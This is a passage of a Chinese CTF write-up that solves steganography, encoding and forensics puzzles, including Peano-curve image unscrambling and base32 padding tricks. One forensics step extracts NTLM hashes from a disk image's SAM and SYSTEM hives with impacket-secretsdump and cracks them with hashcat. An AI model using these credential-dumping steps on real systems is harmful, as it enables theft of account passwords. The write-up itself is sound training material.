class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">peano</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> [[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]]<br>    <span class="hljs-keyword">else</span>:<br>        in_lst = peano(n - <span class="hljs-number">1</span>)<br>        lst = in_lst.copy()<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px - i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + <span class="hljs-number">1</span> + i[<span class="hljs-number">0</span>], py - i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px - i[<span class="hljs-number">0</span>], py - <span class="hljs-number">1</span> - i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py - <span class="hljs-number">1</span> - i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + <span class="hljs-number">1</span> + i[<span class="hljs-number">0</span>], py + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px - i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px,py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        <span class="hljs-keyword">return</span> lst<br>order = peano(<span class="hljs-number">6</span>)<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;&quot;</span>)  <span class="hljs-comment"># peano.jpg的文件路径</span><br>width, height = img.size<br>block_width = width  <span class="hljs-comment">#// 3</span><br>block_height = height <span class="hljs-comment"># // 3</span><br>new_image = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))<br><span class="hljs-keyword">for</span> i, (x, y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(order)):<br>    new_x, new_y = i % width, i // width  <span class="hljs-comment"># 根据列表顺序获取新的坐标</span><br>    pixel = img.getpixel((x, height - <span class="hljs-number">1</span> - y))  <span class="hljs-comment"># 获取原图像素</span><br>    new_image.putpixel((new_x, new_y), pixel)  <span class="hljs-comment"># 在新图像中放置像素</span><br>new_image.save(<span class="hljs-string">&quot;rearranged_image.jpg&quot;</span>）<br></code></pre></td></tr></table></figure><ol><li>复原后得到二维码 扫描</li></ol><p>WHUCTF{Y0U_AR3_tHE_HER0_MAKE_M15C_GR3aT_AgA1N}</p><hr><h2 id="bin败如shadow"><a href="#bin败如shadow" class="headerlink" title="bin败如shadow"></a>bin败如shadow</h2><p>打开解压后的文件夹为key.txt和加密的压缩包，观察txt文件中只有两种字符”喵”和”呜”</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjM1NjM3ZWJiZDMxODI4MTA5NTY3OGU5ZDE2MmY0N2ZfekpsWkw2Q013T3I5eVNuUXYwQ1lxWmRVV01CVkxXd3NfVG9rZW46UDdpMWJRZFdtb1lOaTh4WjJ0emMwMVdkbjI3XzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>由题名中的bin考虑转为二进制数值。但并不知道哪个字符对应0</p><p>从题名的镜子考虑将字符串反转，发现按八位分隔后，文字以“喵呜”或“喵喵”开头，则考虑ASCII编码（ASCII编码中可读字符的编码为33~126，转为八位二进制为01或00开头）</p><p>转为二进制后得到字符<code>bTN3X21ldw</code>，添加两个等号用base64解码得到压缩包密码：<code>m3w_mew</code></p><p>解压压缩包得到txt文件，打开为喵呜二字组成的方阵，这里ctrl加滚轮就可以看出已经被排列出二维码的模样了</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YzZhMmIzMjg0MjU3NGQ0MzkzYjAyNGViNTU1ZDUyM2NfSkx4SW9CcE16ZmVsa29DSU9ycFVDOUJZOTZQRlZRRFpfVG9rZW46QlBlN2JIWFNub1JFcXR4ZkFiMGM5UGJ6bm1jXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>发现是翻转的二维码，截图，将图片镜像后扫描</p><p>当然写个脚本把0和1转为黑白像素块也没问题</p><p>whuctf{mew_mew_mew}</p><hr><h2 id="misc笑传之can’t-count-basic"><a href="#misc笑传之can’t-count-basic" class="headerlink" title="misc笑传之can’t count basic"></a>misc笑传之can’t count basic</h2><p>下载压缩包打开文件为一个1行10000字符的txt文件</p><p>观察发现里面仅含有u,h,c,O,w,C,T,f,N,t,U,F,n,s,{,},3,1这几种字符，考虑将这些字符的出现频率排序</p><p>考虑字频分析排序</p><p>随波逐流一把梭了</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTRkM2NlNDEzZjBjODM3NzJjMDgwYjg3ZTNkYTAxMjlfSVZGYkRSOWtBYml1M2VqYnNhUndBcm95Q0dJcHN4aHJfVG9rZW46RENjS2I2VXpEbzN4MWd4MEJTamNLek5QbmdnXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>whuctf{COUNT1sF3n}</p><hr><h2 id="消失的32名贝斯手"><a href="#消失的32名贝斯手" class="headerlink" title="消失的32名贝斯手"></a>消失的32名贝斯手</h2><p>解压压缩包得到一个jpg文件，放入winhex，发现文件末尾有可读字符串</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTExMzdiYTA0N2Y1ZTFiZDMyOWUxNTU2OTAyYTA0NTBfRmhwek9Vb2dLUjVBQUo4Y3BFa2toOENqcHlRR25peDNfVG9rZW46SzA1OGJPSnRyb1p4aFN4bmNlVWNOSDlkbnpnXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>base32解密</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWIzNTIzYjdhZGJlY2EyZTk3MTliZGRjZGM2M2JjZjJfdGZnbXA5aGlocnF6RG56M3A4d0ZvYnZrWTVYSm13UGxfVG9rZW46UVpiWGIzWVJab1hjWDF4YXVLSGNtZHRUblRoXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>发现依然是base32 继续解密 发现得到的flag提交错误</p><p>根据题目名字”消失的”，思考base32解码的本质：</p><p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p><p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MTVkYzgyMzhmYWMzZjhlZWMxNWYzZDk5YTMyY2ZjNWJfbDIxREpHdHlLTFFUdnZxeElRUWkyZThnZ1JmS1FpTnlfVG9rZW46UzR0bmJNOGlUb3R6Ynl4eW5FNWNKMTVPbkhjXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>base32解码是把每个字符转换为对应的5byte二进制数据，然后将这些二进制数据串联起来，最后按8bit一组进行切分，转换为原始数据，4个等号是为了凑齐每行的40bit，而解码时由于填充，只用到了前16bit，JZAU转化为的是20bit，有4bit“消失了”，用于解码的就是这消失的4bit。（1byte&#x3D;8bits&#x3D;8位)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Plain">JZAU====<br>IFSO====<br>INKG====<br>IZ5R====<br>I5ZG====<br>MVQR====<br>ORPW====<br>MRSU====<br>ORSU====<br>MN2D====<br>NF3F====<br>MVPU====<br>ORUE====<br>NFZW====<br>L5UX====<br>ONP3====<br>ORUF====<br>MVPZ====<br>MNXT====<br>OJZA====<br>MVRX====<br>ORPV====<br>MFXF====<br>ON37====<br>MVZH====<br>HI6D====<br>JJNG====<br>IFKR====<br>INJH====<br>IQZW====<br>JM2T====<br>GJLU====<br>JNNG====<br>JNNE====<br>JRDF====<br>INDP====<br>I5ET====<br>JQ2T====<br>HZID====<br>NRSS====<br>MFZV====<br>MVP7====<br>ON2W====<br>MJWS====<br>NF2D====<br>L54U====<br>N52T====<br>OJPV====<br>MFXD====<br>ON3V====<br>MVZG====<br>ONPZ====<br>ORXT====<br>L5TV====<br>MV2H====<br>L5YE====<br>N5UT====<br>NZ2F====<br>OMQX====<br>EF65====<br></code></pre></td></tr></table></figure><p>比如JZAU经过上表转化的值为9,25,0,20。转换为二进制为01001 11001 00000 10100共20bit，</p><p>取末尾的4bit出来（0100）</p><p>解码得到的字符共60行，将这60组4bit连在一起，每8bit进行ASCII解码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Plain">防止有同学还是没听懂<br>这里对第1-4行进行具体解密举例：<br>JZAU====<br>IFSO====<br>INKG====<br>IZ5R====<br><br>1.由于是取每一行最后4个bit，所以只要先提取每一行最后一个字母<br>U<br>O<br>G<br>R<br><br>2.将字母对照上表（base32字母表）进行转化为十进制，再转为二进制，取出最后4位<br>U-&gt;20-&gt;10100-&gt;0100<br>O-&gt;14-&gt;01110-&gt;1110<br>G-&gt;6-&gt;00110-&gt;0110<br>R-&gt;17-&gt;10001-&gt;0001<br><br>3.将取出的4位二进制合并 每8位转为ascii<br>01001110 01100001<br>    N       a <br></code></pre></td></tr></table></figure><p>NaadCTF{Y0u_sav4d_32_b455i5t5}</p><hr><h2 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag?"></a>Where is the flag?</h2><p>解压，pcl2加载存档文件夹，进入游戏</p><p>发现一块地面和一个循环命令方块</p><p>试了F3+F4发现会被切回冒险模式，试着调出命令方块打印面板发现并没有输出结果，怎么按按钮都没用</p><p>F3查看命令方块坐标，用&#x2F;fill指令将命令方块替换为任意单个体积的方块</p><p>F3+F4切换为创造模式 把刚刚替换后的方块打掉</p><p>发现下面的告示牌</p><p>whuctf{thIs_1s_just_a_easy_0ne}</p><hr><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="deltafuck"><a href="#deltafuck" class="headerlink" title="deltafuck"></a>deltafuck</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU0ZWVjNjYxMzJmZmZmN2ZhOTQyMzkzODE5MjE4NzJfUVZKcEpzRFZ3a3dWZkNyd2NnMXREWkRwUkh6WDdHa2tfVG9rZW46V1lJNGJFbjJtb25HaFB4QXlLWWNkNmV2bkhkXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>DiskGenius打开虚拟磁盘文件</p><p>打开文件夹可以看到windows文件夹和Users文件夹</p><p>Users里有Jacob的用户文件夹</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NDJiYjU0NjM1NDhlOTlmOTJjNDJmNDFjYzU0NzExMzZfOEgzUGhXeE1tbGNqaVlhUHJManJqZlRGVnBnY2o0TnhfVG9rZW46SFZxamJNOGdSb3owaDJ4bEZ1bWNBd3M4bndmXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>在<code>\Windows\System32\config</code>下找到SAM和SYSTEM文件</p><p>右键复制到自己的电脑上 然后拖进kali虚拟机</p><p>使用impacket提取哈希</p><p><code>impacket-secretsdump -system SYSTEM -sam SAM local &gt; hashes.txt</code></p><p><code>cat hashes.txt</code></p><p>得到：</p><p><code>Jacob Haavk:1001:aad3b435b51404eeaad3b435b51404ee:4d6527d571c73d1345e4f9a0ce5759bc:::</code></p><p>后半段就是Jacob的NTLM哈希：<code>4d6527d571c73d1345e4f9a0ce5759bc</code></p><p>cmd5网站爆破一下NTLM 没有cmd5的拿hashcat</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc5YTIxY2MyM2E0NDRkZjdkOTY5YzNmN2I2MmNlNjlfZVN0eWJQSkFTU0NQRGJWTlVPRmNONXNTMTJNeTFmWnhfVG9rZW46UkRsSGJXZ1Bxb1V6NWR4aHBoNWNKZFpFbk1lXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>md5加密一下</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWI5NGMwZWM3Yjc0NDE2YzAwNTU1YWVlMTFiOWYxODJfNXlaOHh3V1pyeE45TE8zeFZGWFBsOVF6NVNqRHBpRU9fVG9rZW46QTloMGJycmNKb0xJU0V4dVhGNmNiSVdVbllmXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>whuctf{b0b2f34c1107598505473e680e02fa3d}</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>vmware打开deltafuck的虚拟机</p><p>直接在此电脑搜索注册表regedit.exe 打开</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDU5MjRhOTkzOTdhNjJhYjk0MTQ4ZmEyOTczYTk3NGJfQ3ZSQ25kOW1oSERCQk1lYjdQdVJPdGhVUndBQkdxVVdfVG9rZW46WENwdWJjNU1Pb09samZ4UjZIWGNCejlybllkXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>flag{Maybe_thIs_ls_the_Easiest_Flag}</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGNkN2MzNzE3ODc0ZmVlYzFlOTc0MjMwMGEzMmNmODlfZDhFczRQQ3U3TlpaMXF6SEtiVWJ4T1lqUldYaHQ4QWpfVG9rZW46RDBiamJvWTFNb0NuWEp4anlycWNuY1RIbkFoXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM0OTFkYzNiYjQxNDIxNWQxMTRmZmE4ZjY5MzkxNGFfNzRXVVE2Q2cwaU9iN1gzVjBhNHptWXFlSmhLejdxZW9fVG9rZW46T21rdWJ6T25YbzQyN0Z4bDJMSmNDRFBwbmZoXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>在文档里发现监听记录文件夹 翻找后发现除了一个其他都是空文件</p><p>把这个有内容的pcapng复制到桌面 wireshark打开发现是USB流量分析</p><p><a href="https://blog.csdn.net/ON_Zero/article/details/130528679">https://blog.csdn.net/ON_Zero/article/details/130528679</a></p><p>参考这篇文章或者直接一把梭</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI4NDhlNzBmZjgxOTMwODRhY2FkYjBjZDAwYmJlZTJfRHRHaVlRZ0RpRnJvVDVJM0lDMVBiZ1oxUVNQbklRWHhfVG9rZW46U1NkdWJ0NE9Sb1ZsdUh4MmFFbWNtdDdjblVjXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>密码：<code>Ahsarahf0rever</code></p><p>这边sishijiu一开始用脚本把所有caps都弄成unknown字符了 联系出题人把答案改成全大写了 后来发现了这个问题 在此致歉</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTFlOWI1ZmZjZjE1MWZmOTNhNmNhMTM2YTIwZjBlZmJfRndPRkk0RjZmWU8xRXEyTnY0QlluSDlXWFdvY3ZuU3JfVG9rZW46UWlxSWJpYTV2bzVXQVN4SWhtbGNYS3NEbmFnXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>whuctf{28b6dea67797417eaacd62785a498070}</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MzZkOWYyODg5Y2Q4OTFkOGUyNWZmMDA5MjFjMjQ1NzZfSEZDNFhrUlpaNXFxSWhwUHlXT0tRRVNZeWNBa1dMYklfVG9rZW46TUF6YmJxZmFtb29sUWp4aHpCeGNjbktFbmplXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>火箭发射文件夹中发现发射程序.exe</p><p>复制到自己电脑的桌面用ida打开</p><p>进来点进main函数按F5看到一串奇怪的字符串 怀疑是加密密钥</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY3NzgzZjVhMzNjMTI4OTkwNjNjMmQxZTAxMTYwMGRfWVJOVDlQdW1IZFl3OEhrcUtTb0NVVE5HaGNLZjZkZW9fVG9rZW46SlZQVGJYcU5jb2llVGd4T2M4ZmNlNGZmbm1iXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>发现里面有个encrypt函数 点进去发现是加密算法</p><p>交给ai帮忙解密一下</p><p>根据给定的加密函数和主函数代码，加密过程是将输入字符串（Rocket Launch Key）与密钥字符串 “Haavk” 进行循环加密。加密公式为： <code>encrypted_char = (original_char + key_char) % 93 + 33</code> 其中，<code>original_char</code> 是输入字符串的每个字符的 ASCII 值，<code>key_char</code> 是密钥 “Haavk” 的循环字符（索引为 <code>i % 5</code>），<code>encrypted_char</code> 是加密后的字符。</p><p>给定的加密后字符串为<code>&quot;_3A|7x76DE7m&gt;3%3&quot;</code>（长度为 17 个字符）。目标是通过反推加密过程，找到原始输入字符串，使得加密后与该字符串匹配。</p><h4 id="反推步骤："><a href="#反推步骤：" class="headerlink" title="反推步骤："></a>反推步骤：</h4><ol><li>计算加密后字符串的 <code>s_i = e_i - 33</code>： <code>e_i</code> 是加密后字符的 ASCII 值，<code>s_i</code> 对应 <code>(original_char + key_char) % 93</code> 的结果。 列出每个字符的 <code>e_i</code> 和 <code>s_i</code>：</li></ol><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>索引 (i)</td><td>加密字符</td><td>e_i (ASCII)</td><td>s_i &#x3D; e_i - 33</td><td></td></tr><tr><td>0</td><td>‘_’</td><td>95</td><td>62</td><td></td></tr><tr><td>1</td><td>‘3’</td><td>51</td><td>18</td><td></td></tr><tr><td>2</td><td>‘A’</td><td>65</td><td>32</td><td></td></tr><tr><td>3</td><td>‘</td><td>‘</td><td>124</td><td>91</td></tr><tr><td>4</td><td>‘7’</td><td>55</td><td>22</td><td></td></tr><tr><td>5</td><td>‘x’</td><td>120</td><td>87</td><td></td></tr><tr><td>6</td><td>‘7’</td><td>55</td><td>22</td><td></td></tr><tr><td>7</td><td>‘6’</td><td>54</td><td>21</td><td></td></tr><tr><td>8</td><td>‘D’</td><td>68</td><td>35</td><td></td></tr><tr><td>9</td><td>‘E’</td><td>69</td><td>36</td><td></td></tr><tr><td>10</td><td>‘&#96;’</td><td>96</td><td>63</td><td></td></tr><tr><td>11</td><td>‘7’</td><td>55</td><td>22</td><td></td></tr><tr><td>12</td><td>‘m’</td><td>109</td><td>76</td><td></td></tr><tr><td>13</td><td>‘&gt;’</td><td>62</td><td>29</td><td></td></tr><tr><td>14</td><td>‘3’</td><td>51</td><td>18</td><td></td></tr><tr><td>15</td><td>‘%’</td><td>37</td><td>4</td><td></td></tr><tr><td>16</td><td>‘3’</td><td>51</td><td>18</td><td></td></tr></tbody></table><ol><li>密钥 “Haavk” 的 ASCII 值和索引： 密钥字符的 ASCII 值：<code>&#39;H&#39;=72</code>, <code>&#39;a&#39;=97</code>, <code>&#39;a&#39;=97</code>, <code>&#39;v&#39;=118</code>, <code>&#39;k&#39;=107</code>。 密钥索引 <code>j = i % 5</code>：</li></ol><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>i</td><td>j &#x3D; i % 5</td><td>key_char</td><td>k_j (ASCII)</td></tr><tr><td>0</td><td>0</td><td>‘H’</td><td>72</td></tr><tr><td>1</td><td>1</td><td>‘a’</td><td>97</td></tr><tr><td>2</td><td>2</td><td>‘a’</td><td>97</td></tr><tr><td>3</td><td>3</td><td>‘v’</td><td>118</td></tr><tr><td>4</td><td>4</td><td>‘k’</td><td>107</td></tr><tr><td>5</td><td>0</td><td>‘H’</td><td>72</td></tr><tr><td>6</td><td>1</td><td>‘a’</td><td>97</td></tr><tr><td>7</td><td>2</td><td>‘a’</td><td>97</td></tr><tr><td>8</td><td>3</td><td>‘v’</td><td>118</td></tr><tr><td>9</td><td>4</td><td>‘k’</td><td>107</td></tr><tr><td>10</td><td>0</td><td>‘H’</td><td>72</td></tr><tr><td>11</td><td>1</td><td>‘a’</td><td>97</td></tr><tr><td>12</td><td>2</td><td>‘a’</td><td>97</td></tr><tr><td>13</td><td>3</td><td>‘v’</td><td>118</td></tr><tr><td>14</td><td>4</td><td>‘k’</td><td>107</td></tr><tr><td>15</td><td>0</td><td>‘H’</td><td>72</td></tr><tr><td>16</td><td>1</td><td>‘a’</td><td>97</td></tr></tbody></table><ol><li><p>反推原始字符 <code>o_i</code>： 根据加密公式 <code>(o_i + k_j) % 93 = s_i</code>， 得 <code>o_i = (s_i - k_j + 93 * m) % 256</code>，其中 <code>m</code> 是整数，需选择 <code>m</code> 使得 <code>o_i</code> 在可打印 ASCII 范围（32-126）。 计算每个 <code>o_i</code>：</p><ol><li><p><code>o_i = s_i - k_j + 93 * m</code>，选择 <code>m</code> 使 <code>o_i</code> 合理。</p></li><li><p>例如，<code>i=0</code>: <code>s_i=62</code>, <code>k_j=72</code>, <code>d = 62 - 72 = -10</code>。 <code>o_i = -10 + 93*m</code>：<code>m=1</code> 时 <code>o_i=83</code> (‘S’)，合理。</p></li><li><p>类似地计算所有位置，得到原始字符：</p></li></ol></li></ol><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>i</td><td>s_i</td><td>k_j</td><td>d &#x3D; s_i - k_j</td><td>o_i (选择 m 后)</td><td>原始字符</td></tr><tr><td>0</td><td>62</td><td>72</td><td>-10</td><td>83 (m&#x3D;1)</td><td>‘S’</td></tr><tr><td>1</td><td>18</td><td>97</td><td>-79</td><td>107 (m&#x3D;2)</td><td>‘k’</td></tr><tr><td>2</td><td>32</td><td>97</td><td>-65</td><td>121 (m&#x3D;2)</td><td>‘y’</td></tr><tr><td>3</td><td>91</td><td>118</td><td>-27</td><td>66 (m&#x3D;1)</td><td>‘B’</td></tr><tr><td>4</td><td>22</td><td>107</td><td>-85</td><td>101 (m&#x3D;2)</td><td>‘e’</td></tr><tr><td>5</td><td>87</td><td>72</td><td>15</td><td>108 (m&#x3D;1)</td><td>‘l’</td></tr><tr><td>6</td><td>22</td><td>97</td><td>-75</td><td>111 (m&#x3D;2)</td><td>‘o’</td></tr><tr><td>7</td><td>21</td><td>97</td><td>-76</td><td>110 (m&#x3D;2)</td><td>‘n’</td></tr><tr><td>8</td><td>35</td><td>118</td><td>-83</td><td>103 (m&#x3D;2)</td><td>‘g’</td></tr><tr><td>9</td><td>36</td><td>107</td><td>-71</td><td>115 (m&#x3D;2)</td><td>‘s’</td></tr><tr><td>10</td><td>63</td><td>72</td><td>-9</td><td>84 (m&#x3D;1)</td><td>‘T’</td></tr><tr><td>11</td><td>22</td><td>97</td><td>-75</td><td>111 (m&#x3D;2)</td><td>‘o’</td></tr><tr><td>12</td><td>76</td><td>97</td><td>-21</td><td>72 (m&#x3D;1)</td><td>‘H’</td></tr><tr><td>13</td><td>29</td><td>118</td><td>-89</td><td>97 (m&#x3D;2)</td><td>‘a’</td></tr><tr><td>14</td><td>18</td><td>107</td><td>-89</td><td>97 (m&#x3D;2)</td><td>‘a’</td></tr><tr><td>15</td><td>4</td><td>72</td><td>-68</td><td>118 (m&#x3D;2)</td><td>‘v’</td></tr><tr><td>16</td><td>18</td><td>97</td><td>-79</td><td>107 (m&#x3D;2)</td><td>‘k’</td></tr></tbody></table><ol><li>原始字符串： 连接所有原始字符：<code>S</code> + <code>k</code> + <code>y</code> + <code>B</code> + <code>e</code> + <code>l</code> + <code>o</code> + <code>n</code> + <code>g</code> + <code>s</code> + <code>T</code> + <code>o</code> + <code>H</code> + <code>a</code> + <code>a</code> + <code>v</code> + <code>k</code> &#x3D; <code>&quot;SkyBelongsToHaavk&quot;</code>。</li></ol><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZkMGFiYjBmYmFkYzNkYWEwNDA4YjgzY2I1NTc2YmVfaUxFaWhBVnNFWlN1U0dNVnJNQjF4Tkt0TEpUNkFQbmRfVG9rZW46VHh6YmJnSWM1b3huNnZ4YXhaUmNVa3pObmVlXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>whuctf{089d37a29a7bc235b842364259720457}</p><h3 id><a href="#" class="headerlink" title="???"></a>???</h3><p>找到彩蛋</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNjODg4NGZkMjlmYWIxMzk4YmRjM2Q4Mzk1ZDIwMThfVzZVQ0NDNWNaNzBVS1prR2lxejhJVjVVM092TFZ1dHhfVG9rZW46V1hlQ2JZTWhzbzVyMFd4Zm1BQ2N3b284bnloXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"></p><p>找到群友和游戏</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjIxMGE1NDczYmQ0NTk3M2EyNzBhYWRlYjRiZGRjNjZfZGJTRTVvMnN1dXpYZU9wWVFyMktXZ3F1STZ4SzlRMVpfVG9rZW46SGl1V2JCdXA4b3NQaVd4UzVqYWNIcVVWblVoXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MmRmMmJjN2NhNDNjMDliZGZmN2ViM2FlZWY1ZWIzNjFfbzdVNmpBMWlva3NTTmtlTFhmRGFPaVdLNHpGRjI3T2JfVG9rZW46WGVnTGI0b1FLb09UeUx4OWdJUWN4a0dxbkhlXzE3NTYwMzU4MTk6MTc1NjAzOTQxOV9WNA"><img 